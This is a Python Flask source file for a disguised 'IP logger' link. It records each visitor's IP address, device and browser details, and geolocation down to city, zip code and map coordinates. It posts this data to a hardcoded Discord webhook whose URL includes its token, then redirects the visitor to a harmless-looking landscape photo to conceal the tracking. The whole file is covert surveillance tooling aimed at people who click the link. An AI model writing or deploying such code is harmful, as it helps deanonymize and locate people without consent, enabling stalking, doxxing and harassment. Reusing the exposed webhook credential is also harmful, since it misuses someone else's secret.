from flask import Flask, request, redirect
import requests
import json
from datetime import datetime
from user_agents import parse

app = Flask(__name__)

# CONFIGURATION
WEBHOOK_URL = "https://discord.com/api/webhooks/1474987213019287745/MiPRIVfwiJcHNgsFlyT_JNFUXWR8E6CxFZpw2henPkFag6vxhDQyXs_92X9EOBsX-9e7"

# CUSTOM IMAGE: Set this to your own image URL if you want a specific one
# If empty, it will use the random ones below
CUSTOM_IMAGE_URL = "" 

# List of random fallback images
IMAGES = [
    "https://images.unsplash.com/photo-1506744038136-46273834b3fb",
    "https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05",
    "https://images.unsplash.com/photo-1441974231531-c6227db76b6e",
    "https://images.unsplash.com/photo-1501785888041-af3ef285b470",
    "https://images.unsplash.com/photo-1493246507139-91e8bef99c02"
]

def get_ip_info(ip):
    try:
        # Added advanced fields: proxy, mobile, currency
        fields = "status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,proxy,mobile,currency"
        response = requests.get(f"http://ip-api.com/json/{ip}?fields={fields}")
        return response.json()
    except Exception:
        return None

@app.route('/')
def logger():
    # Extract IP (Vercel uses x-forwarded-for)
    ip = request.headers.get('x-forwarded-for', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    user_agent_string = request.headers.get('User-Agent', 'Unknown')
    ua = parse(user_agent_string)
    
    # Advanced Device Info
    os_detail = f"{ua.os.family} {ua.os.version_string}"
    browser_detail = f"{ua.browser.family} {ua.browser.version_string}"
    device_type = "📱 Mobile" if ua.is_mobile else "💻 Desktop" if ua.is_pc else "📟 Tablet" if ua.is_tablet else "🤖 Bot" if ua.is_bot else "❓ Unknown"
    
    full_device_info = f"{device_type} | {os_detail} | {browser_detail} | {ua.device.family}"

    # Get Geo-location
    geo = get_ip_info(ip)
    
    # Prepare Discord Webhook Content
    embed = {
        "title": "� Advanced Visitor Logged",
        "color": 3447003, # Blue
        "timestamp": datetime.now().isoformat(),
        "fields": [
            {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
            {"name": "🛠️ Device Type", "value": f"`{device_type}`", "inline": True},
            {"name": "📱 Full Device Info", "value": f"```\n{full_device_info}\n```", "inline": False},
        ]
    }

    if geo and geo.get('status') == 'success':
        # Add flags for Proxy/VPN and Mobile network
        security_status = []
        if geo.get('proxy'): security_status.append("🚫 Proxy/VPN Detected")
        if geo.get('mobile'): security_status.append("📶 Mobile Data")
        
        security_val = "\n".join(security_status) if security_status else "✅ Direct Connection"

        embed["fields"].extend([
            {"name": "🌍 Location", "value": f"{geo.get('city')}, {geo.get('regionName')}, {geo.get('country')} ({geo.get('countryCode')})", "inline": False},
            {"name": "📮 Zip Code", "value": f"`{geo.get('zip')}`", "inline": True},
            {"name": "� Currency", "value": f"`{geo.get('currency')}`", "inline": True},
            {"name": "�️ Connection Security", "value": f"`{security_val}`", "inline": True},
            {"name": "🛰️ ISP / Organization", "value": f"```\n{geo.get('isp')}\n{geo.get('org')}\n```", "inline": False},
            {"name": "🗺️ Google Maps", "value": f"[Click to view {geo.get('city')} on Map](https://www.google.com/maps?q={geo.get('lat')},{geo.get('lon')})", "inline": False},
        ])
    else:
        embed["description"] = "⚠️ Could not retrieve geolocation info. Possibly a Localhost or Reserved IP."
        embed["color"] = 15158332 # Red

    payload = {
        "username": "Advanced IP Locator",
        "embeds": [embed]
    }

    # Send to Discord
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass

    # Redirect to image
    import random
    redirect_url = CUSTOM_IMAGE_URL if CUSTOM_IMAGE_URL else random.choice(IMAGES)
    return redirect(redirect_url)

# For local testing if needed
if __name__ == '__main__':
    app.run(debug=True)
